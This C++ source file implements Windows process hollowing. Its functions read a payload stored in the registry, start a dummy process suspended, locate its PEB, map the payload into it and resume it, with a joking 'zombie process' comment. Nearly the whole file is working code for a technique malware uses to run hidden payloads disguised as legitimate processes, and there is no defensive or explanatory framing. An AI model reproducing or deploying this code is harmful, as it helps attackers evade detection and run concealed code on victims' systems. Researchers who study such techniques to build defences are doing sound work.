#pragma once
#include <string>

#include "base64.h"
#include "ReadExe.h"
#include "WinReg.h"
#include "ProcessHollowing.h"
#include "ntapi.h"
#include "mem.h"

PEB GetPEBExternal(HANDLE hProc)
{
    PROCESS_BASIC_INFORMATION pbi;
    PEB peb = { 0 };

    // DECLARE FUNCTION, UNDOCUMENTED WINDOWS LIBRARY
    tNtQueryInformationProcess NtQueryInformationProcess =
        (tNtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");

    // QUERY DUMMY PROCESS INFORMATION
    NTSTATUS status = NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(pbi), 0);

    if (NT_SUCCESS(status))
    {
        // GET PEB OF DUMMY PROCESS
        ReadProcessMemory(hProc, pbi.PebBaseAddress, &peb, sizeof(peb), 0);
    }

    return peb;
}

PROCESS_INFORMATION GetDummyProcessInfo(LPCSTR strPathToDummyProcess)
{
    PROCESS_INFORMATION destProcessInfo = { 0 };
    STARTUPINFOA startupInfo = { 0 };

    // START DESTINATION PROCESS IN SUSPENDED STATE (DUMMY PROCESS THAT IS TO BE HOLLOWED OUT)
    bool bRet = CreateProcessA((LPSTR)strPathToDummyProcess, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED,
        nullptr, nullptr, &startupInfo, &destProcessInfo);

    // CHECK IF DUMMY PROCESS WAS STARTED
    if (!bRet)
    {
        fprintf(stderr, "Could not create dummy process. ERROR: %X\n",
            GetLastError());
        exit(-1);
    }

    // RETURN DUMMY PROCESS INFO
    return destProcessInfo;
}

int PHollow(LPCSTR strPathToDummyProcess, HKEY hRegPath, const char* strKeyName, std::string strValuePrefix)
{
    // GET HANDLE TO REG KEY
    HKEY hKey = OpenRegKey(hRegPath, strKeyName);

    // GET SOURCE PROCESS INFO
    NewProcessInfo srcProcessInfo = StoreFileBytesInMemory(strKeyName, strValuePrefix);

    // GET DUMMY PROCESS INFO
    PROCESS_INFORMATION destProcessInfo = GetDummyProcessInfo(strPathToDummyProcess);

    // GET DESTINATION PROCESS' PEB
    PEB destProcessPeb = GetPEBExternal(destProcessInfo.hProcess);

    //GET STARTING ADDRESS OF DESTINATION PROCESS
    PVOID destImageBase = destProcessPeb.ImageBaseAddress;

    // INJECT SOURCE PROCESS INTO DESTINATION PROCESS
    auto processInfo = MapTargetProcess(srcProcessInfo, destProcessInfo, destImageBase);

    // RESUME THE NOW ZOMBIE PROCESS. BRAAAIIIIIIIIIIINZZZZ
    RunTargetProcess(srcProcessInfo, processInfo, destImageBase);

    CloseHandle(hKey);
    return 0;
}
